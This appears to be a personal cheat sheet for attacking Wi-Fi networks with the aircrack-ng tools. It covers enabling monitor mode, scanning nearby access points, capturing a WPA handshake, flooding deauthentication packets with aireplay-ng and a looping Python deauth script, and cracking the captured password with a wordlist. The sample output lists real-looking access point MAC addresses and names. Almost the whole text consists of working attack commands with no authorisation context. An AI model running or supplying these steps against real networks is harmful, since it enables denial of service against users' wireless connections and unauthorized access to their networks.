
### Channel list

``` bash
┌──(kali㉿kali)-[~]
└─$ iwlist channel
lo        no frequency information.

eth0      no frequency information.

eth1      no frequency information.

wlan0     32 channels in total; available frequencies :
          Channel 01 : 2.412 GHz
          Channel 02 : 2.417 GHz
          Channel 03 : 2.422 GHz
          Channel 04 : 2.427 GHz
          Channel 05 : 2.432 GHz
          Channel 06 : 2.437 GHz
          Channel 07 : 2.442 GHz
          Channel 08 : 2.447 GHz
          Channel 09 : 2.452 GHz
          Channel 10 : 2.457 GHz
          Channel 11 : 2.462 GHz
          Channel 12 : 2.467 GHz
          Channel 13 : 2.472 GHz
          Channel 14 : 2.484 GHz
          Channel 36 : 5.18 GHz
          Channel 40 : 5.2 GHz
          Channel 44 : 5.22 GHz
          Channel 48 : 5.24 GHz
          Channel 52 : 5.26 GHz
          Channel 56 : 5.28 GHz
          Channel 60 : 5.3 GHz
          Channel 64 : 5.32 GHz
          Channel 100 : 5.5 GHz
          Channel 104 : 5.52 GHz
          Channel 108 : 5.54 GHz
          Channel 112 : 5.56 GHz
          Channel 116 : 5.58 GHz
          Channel 120 : 5.6 GHz
          Channel 124 : 5.62 GHz
          Channel 128 : 5.64 GHz
          Channel 132 : 5.66 GHz
          Channel 136 : 5.68 GHz
          Current Frequency:2.447 GHz (Channel 8)
```


### Enable monitor mode
``` bash
sudo ifconfig wlan0 down
# sudo airmon-ng check kill
sudo airmon-ng start wlan0
```


### Set Channel

``` bash
sudo iw dev wlan0mon set channel 8
```


### Airodump-ng scanning
``` bash
sudo airodump-ng wlan0mon

# 5GHz capture
airodump-ng --band a wlan0mon

# ex)
# 70:5D:CC:65:45:C2 - 305
# 88:36:6C:90:F4:DE - Iptime
# 70:5D:CC:6C:F2:80 - O
# 70:5D:CC:8A:A2:7E - iptime
# 80:4E:81:0A:75:83 - my phone
```


### Save traffic packets
``` bash
sudo airodump-ng --bssid 00:00:00:00:00:00 -w filename wlan0mon
```


### Execute aireplay-ng
``` bash
sudo aireplay-ng --deauth 100 -a 00:00:00:00:00:00 wlan0mon

# ex)
# sudo aireplay-ng --deauth 100 -a 70:5D:CC:65:45:C2 wlan0mon
```

### deauth.py
```python
import os, time

while True:
	os.system("aireplay-ng --deauth 10 -a 00:00:00:00:00:00 wlan0")
	time.sleep(1)

```

```bash
sudo python3 deauth.py
```




### Aireplay-ng error : (wlan0mon is on channel 2, but the AP uses channel 5)
``` bash
sudo airmon-ng start wlan0mon 5
sudo iwconfig wlan0mon channel 5
```



### Cracking password
``` bash
sudo aircrack-ng filename.cap -w dict.lst
```

---

#### Reference

- https://deliberate-practice.tistory.com/48

